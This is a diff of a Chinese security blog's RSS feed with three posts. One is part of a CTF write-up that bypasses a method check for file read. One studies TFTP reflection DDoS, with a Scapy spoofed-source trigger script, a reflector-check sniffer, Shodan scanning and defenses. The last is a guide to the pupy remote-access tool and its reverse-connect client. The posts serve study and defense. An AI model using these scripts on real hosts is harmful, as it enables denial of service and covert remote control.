+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python
+#coding=utf-8   
+
+import sys
+import subprocess   
+
+while 1:
+    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2],sys.argv[3]])
+    if output:
+        print output
+        break&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;输出如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ python get-2.py new-2.py fg_safebox read
+[+]Done!
+&amp;quot;Error: Admin permission denied!!&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;在简单尝试之后”user”只能调用$box对象的view、alist和view方法，唯独不能使用read方法，如果说一定要用read方法，这里估计也是无法绕过去了。不急，继续往下看看有没有思路，在(4)调用相应方法中，其会和PHP对象有关联，而就我知道的和搜索到的，大多都是PHP对象注入问题，而这里也没有魔术方法和序列化之类的东西，猜测也就不是这个考察点。那么关注的重心就移到了(3)判断对象方法是否存在，在使用method_exists的时候会不会出现什么问题呢，看&lt;a href=&quot;https://github.com/php/php-src/blob/f8faffe37edd74e0314f74436825bfcf5be78a49/Zend/zend_builtin_functions.c&quot;&gt;源码&lt;/a&gt;之：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160628/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;唉呀妈呀，其中一句&lt;code&gt;lcname = zend_string_tolower(method_name);&lt;/code&gt;，就猜测这里是先将方法名转成小写再进行判断和利用的。我们这里就可以大小写绕过，使”user”调用的方法为&lt;code&gt;READ&lt;/code&gt;，进入(4)中的函数调用，加上filename的POST就可以进行任意文件读取啦～&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 寻找&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;赶紧读读config.php里面有没有什么东西，结果：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;[+]Done!
+[&amp;quot;&amp;lt;?php\n&amp;quot;,&amp;quot;\/**\n&amp;quot;,&amp;quot; * Created by PhpStorm.\n&amp;quot;,&amp;quot; * User: phithon\n&amp;quot;,&amp;quot; * Date: 16\/6\/8\n&amp;quot;,&amp;quot; * Time: \u4e0a\u534812:24\n&amp;quot;,&amp;quot; *\/\n&amp;quot;,&amp;quot;\n&amp;quot;,&amp;quot;return [\n&amp;quot;,&amp;quot;    \&amp;quot;role\&amp;quot; =&amp;gt; [\n&amp;quot;,&amp;quot;        \&amp;quot;admin\&amp;quot; =&amp;gt; [\n&amp;quot;,&amp;quot;            \&amp;quot;read\&amp;quot;\n&amp;quot;,&amp;quot;        ],\n&amp;quot;,&amp;quot;        \&amp;quot;user\&amp;quot; =&amp;gt; [\n&amp;quot;,&amp;quot;            \&amp;quot;view\&amp;quot;, \&amp;quot;alist\&amp;quot;, \&amp;quot;random\&amp;quot;\n&amp;quot;,&amp;quot;        ]\n&amp;quot;,&amp;quot;    ]\n&amp;quot;,&amp;quot;];&amp;quot;]&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;看来还是要有点渗透思维去读读配置文件什么的，看看flag到底藏在哪，参考&lt;a href=&quot;https://www.91ri.org/7911.html&quot;&gt;Linux渗透与提权：技巧总结篇&lt;/a&gt;与&lt;a href=&quot;https://www.91ri.org/7459.html&quot;&gt;Linux提权后获取敏感信息的方法与途径&lt;/a&gt;，把里面cat的文件全部集中一起，写个脚本跑一遍及可发现flag，代码与之前的类似，详见&lt;a href=&quot;https://github.com/Larryxi/My_tools/tree/master/puzzle2016&quot;&gt;github&lt;/a&gt;&lt;/p&gt;
+
 </description>
         
-        <pubDate>Tue, 28 Jun 2016 08:00:00 -0400</pubDate>
+        <pubDate>Tue, 28 Jun 2016 20:00:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/wooyun-pluzze-3-write-up.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/wooyun-pluzze-3-write-up.html</guid>
@@ -1282,9 +2043,242 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;经由@杀戮提示，让我看看softpedia上的&lt;a href=&quot;http://news.softpedia.com/news/600-000-tftp-servers-can-be-abused-for-reflection-ddos-attacks-501568.shtml&quot;&gt;这篇报道&lt;/a&gt;，咱就来研究一下文中的使用TFTP（Trivial File Transfer Protocol,简单文件传输协议）进行反射型DDOS攻击。在报道的最后提到了&lt;a href=&quot;http://researchrepository.napier.ac.uk/8746/&quot;&gt;Evaluation of TFTP DDoS amplification attack&lt;/a&gt;这篇论文，论文还是比较学术派和严谨的，其中使用GNS3和虚拟机搭建模拟环境，尽量严格控制相关变量与不变量，对TFTPD32，SolarWinds，OpenTFTP三种TFTP服务器进行研究。论文中还利用TFTP协议自身的缺陷来进行DOS攻击，同时对DOS攻击的反射因子，请求响应延迟，总吞吐量，CPU消耗率等方面进行了详细的测验与评估。&lt;/p&gt;
+
+&lt;p&gt;当然，自己实际地测试观察TFTP反射放大攻击的影响还是很有必要的。所以本文就在那篇论文的基础上，利用Kali2等虚拟机，对反射流量和反射因子进行检测计算，适当探究相关的限制与利用。&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-tftp&quot;&gt;0x01 TFTP服务搭建&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;DDOS是分布式拒绝服务攻击，研究的基础也就在于拒绝服务；论文中三种TFTP服务器的测试也是为了相互对比参照，由于不同服务器的特性不同而响应的行为也不同，其中的任何一种服务也具有通用的特性。所以为了方便验证研究，我们就简单地搭建在Kali2上搭建tftp服务（对于协议特点的学习，我比较喜欢直观的办法，搭建好必要服务后抓包看其数据包的结构），对其反射放大流量的利用进行测试，而暂且抛开分布式和其他类型服务器的对比话题。相信这些都是见微知著的，也欢迎你进行其他方面的深入探究交流。&lt;/p&gt;
+
+&lt;p&gt;我们在&lt;a href=&quot;http://jingyan.baidu.com/article/454316ab6fb11af7a7c03ae0.html?qq-pf-to=pcqq.group&quot;&gt;更新源&lt;/a&gt;了的Kali2上进行tftp的安装，详细过程可见&lt;a href=&quot;http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server&quot;&gt;这里&lt;/a&gt;和&lt;a href=&quot;https://doc.ubuntu-fr.org/tftpd&quot;&gt;那里&lt;/a&gt;。在Kali上自带的有tftp客户端，我们可以不用再进行安装。其中主要使用了使用&lt;a href=&quot;http://www.cnblogs.com/itech/archive/2010/12/27/1914846.html&quot;&gt;xinetd&lt;/a&gt;超级守护进程更加方便安全地管理使用tftp服务。最后在服务都安装好后，测试图如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在这里值得一提的是，客户端上键入&lt;code&gt;?&lt;/code&gt;发现有&lt;code&gt;put&lt;/code&gt;命令可以直接上传文件，但是会引发&lt;code&gt;Error code 2: Access violation&lt;/code&gt;错误。究其原因查看&lt;code&gt;man&lt;/code&gt;手册可知道，因为咱们之前在登录的时候没有经过认证就可以读取文件，所以处于安全的考虑，只有文件存在而且对于所有的用户都可写才能&lt;code&gt;put&lt;/code&gt;相应文件，这一点也会成为之后攻击的一个限制。&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-tftp&quot;&gt;0x02 TFTP协议简介&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;对于TFTP协议&lt;a href=&quot;http://baike.baidu.com/link?url=-5Uzv3Mrh9eV3-WnpBBtllBZKT5uXLNgGj7YU1RyeOvdCWtHDlI4s4el5wdOVoKCK47dgUwtu11AO6ZvQ44Srq&quot;&gt;百度&lt;/a&gt;和&lt;a href=&quot;https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol&quot;&gt;WiKi&lt;/a&gt;也有比较详细的介绍，这里不多赘述。我觉得其中最需要理解的有以下三点：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;TFTP是基于UDP的，也就是没有状态性，其端口号为69&lt;/li&gt;
+  &lt;li&gt;无认证过程（对源地址和目的地址均无）&lt;/li&gt;
+  &lt;li&gt;TFTP几种不同类型的数据包在传递信息时的交互过程&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下面给出TFTP数据包的&lt;a href=&quot;https://www.ietf.org/rfc/rfc1350.txt&quot;&gt;几种类型&lt;/a&gt;：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;TFTP Formats    
+
+   Type   Op #     Format without header    
+
+          2 bytes    string   1 byte     string   1 byte
+          -----------------------------------------------
+   RRQ/  | 01/02 |  Filename  |   0  |    Mode    |   0  |
+   WRQ    -----------------------------------------------
+          2 bytes    2 bytes       n bytes
+          ---------------------------------
+   DATA  | 03    |   Block #  |    Data    |
+          ---------------------------------
+          2 bytes    2 bytes
+          -------------------
+   ACK   | 04    |   Block #  |
+          --------------------
+          2 bytes  2 bytes        string    1 byte
+          ----------------------------------------
+   ERROR | 05    |  ErrorCode |   ErrMsg   |   0  |
+          ----------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;就拿A对S上的&lt;code&gt;RRQ (read request)&lt;/code&gt;文件过程来演示一下，如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;具体过程文字描述如下：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;A向S的69端口发送RRQ数据包请求读取文件，其中包括文件名和传输使用的模式&lt;/li&gt;
+  &lt;li&gt;S再新开一个端口发送DATA数据包开始传输文件，其中Data段中包含着文件内容，如果大于512字节（默认值），就会进行分块传输（对应标记Block的值），直到最后一次发送的数据包Data段小于512字节&lt;/li&gt;
+  &lt;li&gt;A在接收到DATA数据包后就向S发送ACK数据包进行确认，其中的Block就为接收到的DATA数据包中的Blocak，然后S才会继续发下一个Block的DATA数据包&lt;/li&gt;
+  &lt;li&gt;如果S没有接收到A的ACK数据包，S就会重传刚才发过的DATA数据包&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;实际测试的抓包图如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 反射放大攻击&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;反射是过程，放大是结果。对于拒绝服务攻击来说，常用的方式有这么几种：1.滥用合理的服务请求；2.制造高流量无用数据；3.利用传输协议缺陷；4.利用服务程序的漏洞。TFTP反射放大攻击就是利用了协议上的缺陷或者说是特性，其中关键点有二：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;没有认证过程，这样就可以随意登录读取文件，同时伪造源（攻击目标）IP地址，为反射做好准备&lt;/li&gt;
+  &lt;li&gt;之前提到的重传机制，当服务端在没有收到我们的攻击目标的ACK包时，就会重传一定的次数给攻击目标，达到放大的目的&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下面我就在本机上借由&lt;a href=&quot;https://github.com/Larryxi/Scapy_zh-cn&quot;&gt;Scapy&lt;/a&gt;伪造源地址数据包，向服务端(Kali2)发送RRQ数据包请求&lt;code&gt;get&lt;/code&gt;服务器上的文件，进而将响应DATA包发射给目标机(XP)，诱发重传机制造成放大攻击。利用Scapy如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; a = IP(dst='192.168.1.104',src='192.168.1.102')/UDP(sport=445,dport=69)/TFTP()/TFTP_RRQ(filename='larry')
+&amp;gt;&amp;gt;&amp;gt; a
+&amp;lt;IP  frag=0 proto=udp src=192.168.1.102 dst=192.168.1.104 |&amp;lt;UDP  sport=microsoft_ds dport=tftp |&amp;lt;TFTP  op=RRQ |&amp;lt;TFTP_RRQ  filename='larry' |&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;也还是有两点需要说明，我们这里伪造的源端口用的是XP SP3默认开启的UDP端口之一(123,137,138,445,500,1900)，当然你也可以用其他你在攻击目标上扫描出来的端口；另一点就是为了达到放大数据包大小的最佳效果，我们这里&lt;code&gt;RRQ&lt;/code&gt;的已知文件的大小必须大于512字节为好。三个主机在同一个网段下的测试结果图如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在搭建传统的LAN环境的时候，会要求TFTP服务器对所有客户端是可连接的，通常会将其拿来当做内部网络网关。如果这些TFTP服务器同时暴露在外的话，我们就可以利用其在网络当中的角色加上对源地址无验证的缺陷,对内网机器进行DOS攻击。当然鸡肋的会是我们不知道在内网当中有哪些机器，就算攻击成功了，由于没有回执响应，我们就不知道实际情况是如何而“盲打”一通了。在vbox当中创建一个&lt;a href=&quot;https://www.youtube.com/watch?v=nsbxw_jx1wQ&quot;&gt;内网环境&lt;/a&gt;，同时给服务端设置&lt;a href=&quot;http://gfrog.net/2008/01/config-file-in-debian-interfaces-1/&quot;&gt;两个网卡&lt;/a&gt;，测试结果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从以上的测试结果可以看出由于tftpd服务的特性，在服务端未接收到ACK数据包时，会默认进行5次重传，并且重传时间间隔（可设置）为5秒。对于不同的反射放大攻击，例如&lt;a href=&quot;http://baike.baidu.com/link?url=S20WqQCEfXL7YDelSc2bVLw-veVfXFPpYdsy64mCQZ_kV66yFpq3fsDTVWT9rN2xU-hO6PIJAbSKjUzAU9j9XK&quot;&gt;Smurf&lt;/a&gt;，DNS，&lt;a href=&quot;http://drops.wooyun.org/papers/926&quot;&gt;NTP&lt;/a&gt;，TCP-based，&lt;a href=&quot;http://drops.wooyun.org/tips/2106&quot;&gt;SNMP&lt;/a&gt;等反射放大攻击，研究时通常会计算其中的反射因子/放大倍数作为相互比较的标准。在基于tftpd的TFTP反射放大攻击中，这里响应数据包大小总和比上请求数据包大小为：&lt;code&gt;558*5/60=46.5&lt;/code&gt;。为了简单地对比一下，我还是在XP上下载了&lt;a href=&quot;http://tftpd32.jounin.net/tftpd32_download.html&quot;&gt;tftpd32&lt;/a&gt;，然后再去&lt;code&gt;get&lt;/code&gt;自带的文件&lt;code&gt;tftpd32.chm&lt;/code&gt;（其实在默认状态下tftpd32是允许&lt;code&gt;put&lt;/code&gt;文件的，但也可在&lt;code&gt;Setting&lt;/code&gt;中设置为&lt;code&gt;Read Only&lt;/code&gt;模式）。tftpd32的特性就是会重传6次，时间间隔依次为1,2,3,3,3秒，最后还会发送一个ERROR数据包。这里抛开ERROR数据包计算反射因子的话就是&lt;code&gt;558*6/62=54&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在论文中的tftpd32版本可能有所不同，反射因子为&lt;code&gt;59.78&lt;/code&gt;，这个放大因子和其他反射放大攻击相比较还是很可观的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x04-&quot;&gt;0x04 限制及解决方案&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;在以上的测试过程中，对于TFTP反射放大攻击利用的限制点主要有三点：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1. 获取TFTP服务器上存在的文件名&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;虽然服务器端无认证过程可以随意登录，但是无法列目录，而造成反射的基础就是需要服务端能够发送出DATA数据包。这就需要我们一个个&lt;code&gt;get&lt;/code&gt;测试看看TFTP服务器上存在哪些常见的文件了，我们可以对思科（广泛使用TFTP服务）设备文件和其他你认为有可能存在的文件进行测试。还好&lt;a href=&quot;http://seclists.org/nmap-dev/2011/q2/730&quot;&gt;nmap&lt;/a&gt;在这里给我们提供了一个&lt;a href=&quot;https://nmap.org/nsedoc/scripts/tftp-enum.html&quot;&gt;tftp-enum.nse&lt;/a&gt;脚本，可以如下使用：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;$ sudo nmap -sU -p 69 --script tftp-enum.nse --script-args=&amp;quot;tftp-enum.filelist=customlist.txt&amp;quot; &amp;lt;host&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;如果未加&lt;code&gt;--script-args&lt;/code&gt;的话，脚本会默认调用&lt;a href=&quot;https://github.com/nmap/nmap/blob/master/nselib/data/tftplist.txt&quot;&gt;tftplist.txt&lt;/a&gt;文件去枚举可能存在的文件。当然，&lt;code&gt;tftp-enum.filelist&lt;/code&gt;可以指定自定义的列表进行枚举扫描。测试结果示例如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;论文当中说是有&lt;a href=&quot;http://internetcensus2012.bitbucket.org/serviceprobe_overview.html&quot;&gt;599600&lt;/a&gt;台（2012年扫描结果）对外开放的TFTP服务器可能会被用来进行发射放大攻击，但在&lt;a href=&quot;https://www.shodan.io/search?query=tftp&quot;&gt;shodan&lt;/a&gt;上搜索&lt;code&gt;tftp&lt;/code&gt;的结果也只有10w左右的样子，可能有待进一步的扫描发现。以下是我在&lt;a href=&quot;https://shodanio.wordpress.com/2014/12/01/using-shodan-from-the-command-line/&quot;&gt;shodan&lt;/a&gt;中搜索出的999个IP进行测试，其中有47个服务器可以&lt;code&gt;get&lt;/code&gt;到默认的文件：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20160323/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. TFTP服务器上已知文件的大小&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;反射过来的DATA数据包的大小取决于读取文件的内容大小，这样就决定了我们最终反射放大的程度（相对于已知文件的文件名长度——影响请求包大小）。如果DATA数据包过小造成的影响也就很有限的了。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. 确定TFTP服务器可利用&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;除了以上两点，如果存在其他的过滤机制，我们最终就需要测试一下该TFTP服务是否可利用，在攻击端伪造简单的数据包触发其反射到指定的主机上，代码如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python
+#coding=utf-8    
+
+import optparse
+import sys
+import logging    
+
+from scapy.all import *    
+
+class Trigger(object):
+    def __init__(self, target, port, filename, server):
+        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+        self.target = target
+        self.port = port
+        self.filename = filename
+        self.server = server    
+
+    def run(self):
+        t = IP(src=self.target, dst=self.server)/UDP(sport=self.port, dport=69)/TFTP()/TFTP_RRQ(filename=self.filename)
+        send(t)
+        print '[+] The trigger has benn sent !'    
+
+if __name__ == '__main__':
+    parser = optparse.OptionParser('uasge: %prog [options]')
+    parser.add_option('-t', '--target', default=None,help='The ip of target')
+    parser.add_option('-f', '--filename', default='larry', help='The filename for RRQ')
+    parser.add_option('-p', '--port', type=int, default=2333, help='The src port of target')    
+
+    (options, args) = parser.parse_args()
+    if len(args) &amp;lt; 1 or options.target == None:
+        parser.print_help()
+        sys.exit(0)    
+
+    trigger = Trigger(target=options.target, port=options.port, filename=options.filename, server=args[0])    
+
+    trigger.run()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;在我们之前指定的主机上检测一下是否有如期的DATA数据包到来即可，代码如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python
+#coding=utf-8    
+
+import optparse
+import sys
+import logging    
+
+from scapy.all import *    
+
+class Sniff(object):
+    def __init__(self, port):
+        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+        self.port = port    
+
+    def run(self):
+        try:
+            sniff(prn=self.udp_monitor_callback, filter='udp', store=0)
+        except KeyboardInterrupt as e:
+            print '[+] Bye !'
+            sys.exit(0)    
+
+    def udp_monitor_callback(self, pkt):
+        if pkt.getlayer(Raw):
+            raw_load = pkt.getlayer(Raw).load
+            if pkt[UDP].dport == self.port and raw_load[:4] == '\x00\x03\x00\x01':
+                print '[+] The server %s is available' % (pkt[IP].src)
+                sys.exit(0)    
+
+if __name__ == '__main__':
+    parser = optparse.OptionParser('usage: %prog [options]')
+    parser.add_option('-p', '--port', type=int, default=2333, help='The port from server')    
+
+    (options, args) = parser.parse_args()
+    if len(args) &amp;gt; 0:
+        parser.print_help()
+        sys.exit(0)    
+
+    s = Sniff(port=options.port)    
+
+    s.run()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这样一放一收就可以知道该TFTP服务器是否可以利用了。&lt;/p&gt;
+
+&lt;h1 id=&quot;x05-&quot;&gt;0x05 防御及相关对策&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;虽然有些TFTP服务器因为配置错误而暴露在外，但还是应该利用防火墙将其从互联网上隔离&lt;/li&gt;
+  &lt;li&gt;对流经TFTP服务的流量设置相关入侵检测机制&lt;/li&gt;
+  &lt;li&gt;将重传（数据包）率设置为1，但还是需要和服务不可达的情况做一下平衡&lt;/li&gt;
+  &lt;li&gt;简化自定义错误消息（有些tftp服务具有在重传无响应后还会发送ERROR数据包，间接将流量放大）；记录响应的日志；限制请求数据包的数量&lt;/li&gt;
+&lt;/ol&gt;
+
 </description>
         
-        <pubDate>Wed, 23 Mar 2016 06:30:00 -0400</pubDate>
+        <pubDate>Wed, 23 Mar 2016 18:30:00 +0800</pubDate>
         <link>
         https://larryxi.github.io/tftp-reflection-and-amplification-attack.html</link>
         <guid isPermaLink="true">https://larryxi.github.io/tftp-reflection-and-amplification-attack.html</guid>
@@ -1297,9 +2291,406 @@ patching file ext/simplexml/simplexml.c
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 前言&lt;/h1&gt;
 
+&lt;hr /&gt;
+
+&lt;p&gt;菜鸡我总结一下一个python远控——pupy的使用帮助，github地址为：&lt;a href=&quot;https://github.com/n1nj4sec/pupy&quot;&gt;https://github.com/n1nj4sec/pupy&lt;/a&gt;，作者对其能够实现的功能写得很清除。其主要依赖rpyc来实现远程控制，并且使用Python作为脚本语言从而实现跨平台操作，再使用PupyServer和PupyCmd的继承，实现控制端的主要功能，各个模块均继承自PupyModules来通过run命令实现对应模块功能。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/dir1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;client目录存放客户端（受控端）脚本以及一些源文件，docs则是说明文档相关，pupy则是服务端（控制端）相关脚本&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/dir2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;cypto中是一些方向ssl连接需要的证书文件，modules中是一些run命令运行的模块脚本，packages中是不同平台上实现模块功能的根本脚本，payload_templates则是生成客户端exe及dll的模板，pupylib中是服务端核心功能中几个重要的类文件，pupy.conf是配置文件设置服务地址端口，颜色显示及命令别名，pupygen.py生成Windows平台上的exe或dll客户端，pupysh.py则是pypushell主程序&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-&quot;&gt;0x01 准备&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;windows&quot;&gt;1.生成Windows上的客户端&lt;/h2&gt;
+
+&lt;p&gt;github的ReadMe里面都写得很清楚，这里我开了3个虚拟机，服务端（主控端）的Kali2（172.16.162.130），客户端（受控端）的xp（172.16.162.133）和Kali（172.16.162.129），穷屌我这里就不测试Mac了&lt;/p&gt;
+
+&lt;p&gt;对于Windows主要是通过pupy文件夹下的pupygen.py生成对应x86或x64平台的exe或dll（用于反向注射）&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;host为回连主机地址，-p指定回连端口，-t指定生成文件类型，-o指定生成文件名,然后生成对应二进制文件&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;i=binary.find(&amp;quot;&amp;lt;default_connect_back_host&amp;gt;:&amp;lt;default_connect_back_port&amp;gt;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&amp;quot;, i+1)
+...
+new_host=&amp;quot;%s:%s\x00\x00\x00\x00&amp;quot;%(host,ip)
+...
+binary=binary[0:offsets[0]]+new_host+binary[offsets[0]+len(new_host):]&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;找到二进制文件中对应的标志位，再将host及ip写入&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;kali&quot;&gt;2.生成Kali上的客户端&lt;/h2&gt;
+
+&lt;p&gt;Windows平台下如果有Python，rpyc，pupy也是类似的&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;rhost,rport=None,None
+        tab=HOST.rsplit(&amp;quot;:&amp;quot;,1)
+        rhost=tab[0]
+        if len(tab)==2:
+            rport=int(tab[1])
+        else:
+            rport=443
+        print &amp;quot;connecting to %s:%s&amp;quot;%(rhost,rport)
+        conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;默认是443端口并以冒号分割，再使用rpyc模块进行ssl连接到控制端，循环等待并打印出连接信息&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-&quot;&gt;0x02 开始&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;直接运行pupy/pupy/pupysh.py便可以启用客户端（pupyshell），自然使用help或?查看帮助&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在pupysh.py中主要是导入pupylib.PupyServer和pupylib.PupyCmd，分别实例化，并使用PupyCmd继承cmd.Cmd中的cmdloop()方法，来解析并执行命令&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;...
+pupyServer=pupylib.PupyServer.PupyServer()
+...
+pupyServer.start()
+    pcmd=pupylib.PupyCmd.PupyCmd(pupyServer)
+    while True:
+        try:
+            pcmd.cmdloop()&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;有趣的是在有中文版xp的受控端进入后，使用clients或sessions命令时均会出现如下错误&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;看是解码错误，便在pupylib/PupyCmd.py中在导入模块后再添加以下代码就okay啦&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;if sys.getdefaultencoding()!='gbk':
+  reload(sys)
+  sys.setdefaultencoding('gbk')&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;clients&quot;&gt;clients&lt;/h2&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;python&quot;&gt;def do_clients(self, arg):
+        &amp;quot;&amp;quot;&amp;quot; alias for sessions &amp;quot;&amp;quot;&amp;quot;
+        self.do_sessions(arg)&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;可以看出来是和sessions的功能一样&lt;/p&gt;
+
+&lt;h2 id=&quot;sessions&quot;&gt;sessions&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20151008/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
